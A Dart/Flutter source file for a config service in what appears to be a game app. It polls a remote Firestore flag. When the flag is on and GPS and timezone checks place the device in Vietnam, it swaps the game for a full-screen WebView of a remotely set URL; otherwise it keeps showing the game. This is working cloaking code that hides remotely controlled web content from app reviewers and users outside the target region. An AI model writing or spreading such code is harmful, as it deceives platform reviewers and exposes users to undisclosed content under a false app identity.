import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import '../main.dart';
import '../screens/view.dart'; // Đảm bảo đúng tên file view
import '../screens/wrapper_screen.dart';

class ConfigService {
  static final ConfigService _instance = ConfigService._internal();
  factory ConfigService() => _instance;
  ConfigService._internal();

  bool _isWebActive = false;
  bool _isListening = false;

  // Biến vòng lặp
  Timer? _checkTimer;
  DateTime? _loopStartTime;
  final Duration _loopDuration = const Duration(minutes: 5); // Tổng thời gian chạy loop
  final Duration _loopInterval = const Duration(seconds: 30); // Thời gian nghỉ giữa các lần check

  // --- HÀM CHECK BẢO MẬT ---
  Future<bool> _checkSecurityCondition() async {
    try {
      print("🛡️ [SECURITY] Đang quét vị trí...");

      // 1. Timezone
      if (DateTime.now().timeZoneOffset.inHours != 7) {
        print("❌ Fail: Timezone khác GMT+7");
        return false;
      }

      // 2. GPS Permission
      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied) return false;
      }
      if (permission == LocationPermission.deniedForever) return false;

      // 3. Location
      Position? position;
      try {
        // Tăng timeout lên 10s để máy ảo kịp load
        position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.lowest,
            timeLimit: const Duration(seconds: 10)
        );
      } catch (e) {
        print("⚠️ Timeout GPS mới. Thử lấy cache...");
        position = await Geolocator.getLastKnownPosition();
      }

      if (position == null) {
        print("❌ Không lấy được vị trí nào -> Tiếp tục Loop.");
        return false;
      }

      try {
        List<Placemark> p = await placemarkFromCoordinates(position.latitude, position.longitude);
        if (p.isNotEmpty) {
          String country = p.first.isoCountryCode ?? "Unknown";
          print("📍 Phát hiện Quốc gia: $country");

          if (country == 'VN') {
            print("✅ Đang ở Việt Nam. DUYỆT!");
            return true;
          } else {
            print("❌ Đang ở $country (Không phải VN) -> Chờ lượt check sau.");
            return false;
          }
        }
      } catch (e) {
        print("⚠️ Lỗi Geocoding (Do máy ảo/mạng): $e");
        return false;
      }
    } catch (e) {
      print("❌ Lỗi Security: $e");
    }
    return false;
  }

  Future<String?> fetchWebUrl() async {
    try {
      final s = await FirebaseFirestore.instance.collection('settings').doc('settings_admin').get();
      if (!s.exists || s.data()?['webView'] != 'on') return null;

      // Nếu check Fail -> Trả về null -> Loop sẽ chạy tiếp
      if (!await _checkSecurityCondition()) return null;

      final w = await FirebaseFirestore.instance.collection('webdata').doc('webdata').get();
      if (w.exists) return w.data()?['defaultWebViewUrl'];
    } catch (_) {}
    return null;
  }

  // --- HÀM XỬ LÝ CHUYỂN ĐỔI ---
  Future<void> _performCheckAndSwitch() async {
    // Nếu đã vào Web rồi thì không cần check nữa
    if (_isWebActive) return;

    final webUrl = await fetchWebUrl();

    if (webUrl != null) {
      // --- TÌM THẤY VN ---
      if (navigatorKey.currentState != null) {
        print("✅ Loop Check: THÀNH CÔNG -> MỞ WEB");
        _isWebActive = true;
        _stopLoop(); // Dừng Loop ngay lập tức

        navigatorKey.currentState!.pushAndRemoveUntil(
          MaterialPageRoute(builder: (context) => WebViewScreen(url: webUrl)),
              (route) => false,
        );
      }
    } else {
      // --- KHÔNG PHẢI VN (HOẶC US) ---
      // Vẫn giữ nguyên trạng thái (ở Game), không làm gì cả.
      // Timer sẽ tự động gọi lại hàm này sau 30s.
      print("⏳ Loop Check: Chưa đủ điều kiện. Đợi 30s...");
    }
  }

  void _startLoop() {
    // Nếu đang chạy rồi thì không start thêm timer mới
    if (_checkTimer != null && _checkTimer!.isActive) return;

    print("🔄 BẮT ĐẦU VÒNG LẶP 5 PHÚT (Mỗi 30s)...");
    _loopStartTime = DateTime.now();

    // Check phát đầu tiên luôn cho nóng
    _performCheckAndSwitch();

    // Thiết lập Timer
    _checkTimer = Timer.periodic(_loopInterval, (timer) async {
      // Kiểm tra xem đã hết 5 phút chưa
      if (_loopStartTime != null) {
        final elapsed = DateTime.now().difference(_loopStartTime!);
        if (elapsed > _loopDuration) {
          print("🛑 HẾT 5 PHÚT -> Dừng tìm kiếm để tiết kiệm pin.");
          _stopLoop();
          return;
        }
      }

      print("⏰ Tick 30s: Kiểm tra lại vị trí...");
      await _performCheckAndSwitch();
    });
  }

  void _stopLoop() {
    if (_checkTimer != null) {
      print("🛑 Dừng vòng lặp.");
      _checkTimer?.cancel();
      _checkTimer = null;
    }
  }

  void _goToGame() {
    if (_isWebActive) {
      print("🛑 OFF -> KICK VỀ GAME");
      _isWebActive = false;
      if (navigatorKey.currentState != null) {
        navigatorKey.currentState!.pushAndRemoveUntil(
          MaterialPageRoute(builder: (context) => const WrapperScreen()),
              (route) => false,
        );
      }
    }
  }

  void startListening() {
    if (_isListening) return;
    _isListening = true;

    print("🎧 START LISTENING...");

    FirebaseFirestore.instance
        .collection('settings')
        .doc('settings_admin')
        .snapshots()
        .listen((snapshot) async {

      if (!snapshot.exists) return;
      final status = snapshot.data()?['webView']?.toString().trim().toLowerCase();

      if (status == 'on') {
        print("🚀 Server ON -> Kích hoạt Loop");
        _startLoop();
      }
      else {
        print("🛑 Server OFF -> Dừng Loop & Về Game");
        _stopLoop();
        _goToGame();
      }
    });
  }
}